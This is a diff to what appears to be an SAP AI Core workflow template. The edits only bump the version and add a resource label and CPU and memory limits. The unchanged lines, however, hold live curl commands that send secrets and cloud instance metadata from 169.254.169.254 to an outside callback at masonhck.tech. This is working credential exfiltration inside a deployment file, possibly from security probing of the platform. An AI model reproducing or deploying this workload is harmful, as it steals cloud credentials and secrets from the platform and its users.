@@ -10,11 +10,14 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "1.0.0"
+    ai.sap.com/version: "1.0.1"
 spec:
   entrypoint: main
   templates:
   - name: main
+    metadata:
+      labels:
+        ai.sap.com/resourcePlan: starter
     container:
       image: curlimages/curl:latest
       command:
@@ -30,3 +33,10 @@ spec:
           curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-secrets" -d @-
         curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/" | \
           curl -s -X POST "https://www.masonhck.tech/cb.php?src=wft-imds" -d @-
+      resources:
+        limits:
+          cpu: "1"
+          memory: "1Gi"
+        requests:
+          cpu: "100m"
+          memory: "128Mi"
